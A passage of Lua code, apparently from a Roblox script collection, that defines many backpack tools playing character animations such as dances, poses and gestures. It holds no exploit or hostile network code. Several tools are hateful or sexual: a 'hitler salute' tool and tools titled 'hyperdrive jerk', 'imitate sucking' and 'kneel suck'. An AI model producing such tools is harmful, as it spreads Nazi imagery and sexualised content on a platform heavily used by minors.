	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2

	tool.Equipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end

		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack.Looped = false
		animTrack:Play()
		animTrack.TimePosition = 0.4
        animTrack:AdjustSpeed(0.8)
        
        animTrack2 = animator:LoadAnimation(animation2)
        animTrack.Priority = Enum.AnimationPriority.Action
        animTrack2:Play()
        animTrack2.TimePosition = 1
        animTrack2:AdjustSpeed(0)

		loopConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if animTrack and animTrack.Length > 0 and animTrack.TimePosition >= animTrack.Length then
				animTrack:Play()
				animTrack.TimePosition = 0.4
        animTrack:AdjustSpeed(0.8)
			end
		end)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
end)

task.spawn(function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "hyperdrive jerk"
local ANIMATION_ID = "rbxassetid://72042024"
local ANIMATION_ID2 = "rbxassetid://168268306"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local loopConnection = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2

	tool.Equipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end

		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack.Looped = false
		animTrack:Play()
		animTrack.TimePosition = 0.4
    animTrack:AdjustSpeed(2)
        
    animTrack2 = animator:LoadAnimation(animation2)
    animTrack.Priority = Enum.AnimationPriority.Action
    animTrack2:Play()
    animTrack2.TimePosition = 1
    animTrack2:AdjustSpeed(0)

		loopConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if animTrack and animTrack.Length > 0 and animTrack.TimePosition >= animTrack.Length then
				animTrack:Play()
				animTrack.TimePosition = 0.4
        animTrack:AdjustSpeed(2)
			end
		end)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
end)
]], "CS / SS")

cscript("r6 hitler salute tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "austrian salute"
local ANIMATION_ID = "rbxassetid://176236333"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    t(0.1)
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 dab tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "dab"
local ANIMATION_ID = "rbxassetid://248263260"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 arm helicopter tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "arm helicopter"
local ANIMATION_ID = "rbxassetid://259438880"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(999)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 lay down tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "lay down"
local ANIMATION_ID = "rbxassetid://181526230"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 t pose tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "t pose"
local ANIMATION_ID = "rbxassetid://188242481"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 hands up tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "hands up"
local ANIMATION_ID = "rbxassetid://187951261"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 dance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "dance"

local ANIMATIONS = {
    "rbxassetid://161099825",
    "rbxassetid://27789359",
    "rbxassetid://248263260",
    "rbxassetid://182435998",
    "rbxassetid://52155014",
    "rbxassetid://28488254",
    "rbxassetid://35634514",
    "rbxassetid://35654637",
    "rbxassetid://45834924",
    "rbxassetid://429703734",
    "rbxassetid://466755434",
    "rbxassetid://429730430",
    "rbxassetid://30196114",
    "rbxassetid://33796059",
    "rbxassetid://45834924",
    "rbxassetid://182491277",
    "rbxassetid://182491368",
}

local function giveTool()
    if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

    local tool = Instance.new("Tool")
    tool.Name = TOOL_NAME
    tool.RequiresHandle = false
    tool.CanBeDropped = false
    tool.Parent = LocalPlayer:WaitForChild("Backpack")

    return tool
end

local function setupTool(tool)
    local animTrack = nil
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

    local function getRandomAnimation()
        local randomIndex = math.random(1, #ANIMATIONS)
        local animation = Instance.new("Animation")
        animation.AnimationId = ANIMATIONS[randomIndex]
        return animation
    end

    tool.Equipped:Connect(function()
        if animTrack then animTrack:Stop() end
        local animation = getRandomAnimation()
        animTrack = animator:LoadAnimation(animation)
        animTrack.Priority = Enum.AnimationPriority.Action
        animTrack:Play()
        animTrack.Looped = true
        animTrack:AdjustWeight(999)
    end)

    tool.Unequipped:Connect(function()
        if animTrack then
            animTrack:Stop()
            animTrack = nil
        end
    end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 the charleston tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "the charleston"
local ANIMATION_ID = "rbxassetid://429703734"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 kneel down tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "kneel down"
local ANIMATION_ID = "rbxassetid://287325678"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 cradle tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "cradle"
local ANIMATION_ID = "rbxassetid://180612465"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack.TimePosition = 0.6
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 jumping jacks tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "jumping jacks"
local ANIMATION_ID = "rbxassetid://429681631"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 frantic tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "frantic"
local ANIMATION_ID = "rbxassetid://73137648"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 shocked tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "shocked"
local ANIMATION_ID = "rbxassetid://94861246"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack.TimePosition = 1.3
    animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 spin dance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "spin dance"
local ANIMATION_ID = "rbxassetid://429730430"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 look right tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "look right"
local ANIMATION_ID = "rbxassetid://88016955"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 bow down tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "bow down"
local ANIMATION_ID = "rbxassetid://204292303"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
        t(0.9)
        animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 the thinker tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "the thinker"
local ANIMATION_ID = "rbxassetid://120735709"
local ANIMATION_ID2 = "rbxassetid://120735762"
local ANIMATION_ID3 = "rbxassetid://287325678"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local animTrack3 = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2
	
	local animation3 = Instance.new("Animation")
	animation3.AnimationId = ANIMATION_ID3

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		if animTrack2 then animTrack2:Stop() end
		if animTrack3 then animTrack3:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack2 = animator:LoadAnimation(animation2)
		animTrack2.Priority = Enum.AnimationPriority.Action
		animTrack2:Play()
		animTrack3 = animator:LoadAnimation(animation3)
		animTrack3.Priority = Enum.AnimationPriority.Action
		animTrack3:Play()
		animTrack3:AdjustWeight(999)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
		if animTrack3 then
			animTrack3:Stop()
			animTrack3 = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 imitate sucking tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "imitate sucking"
local ANIMATION_ID = "rbxassetid://73177702"
local ANIMATION_ID2 = "rbxassetid://183696478"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		if animTrack2 then animTrack2:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustWeight(1)
		animTrack2 = animator:LoadAnimation(animation2)
		animTrack2.Priority = Enum.AnimationPriority.Action
		animTrack2:Play()
		animTrack2:AdjustWeight(1)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r6 kneel suck tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "kneel suck"
local ANIMATION_ID = "rbxassetid://73177702"
local ANIMATION_ID2 = "rbxassetid://287325678"
local ANIMATION_ID3 = "rbxassetid://183696478"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack1 = nil
	local animTrack2 = nil
	local animTrack3 = nil

	local function stopAll()
		if animTrack1 then animTrack1:Stop() animTrack1 = nil end
		if animTrack2 then animTrack2:Stop() animTrack2 = nil end
		if animTrack3 then animTrack3:Stop() animTrack3 = nil end
	end

	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
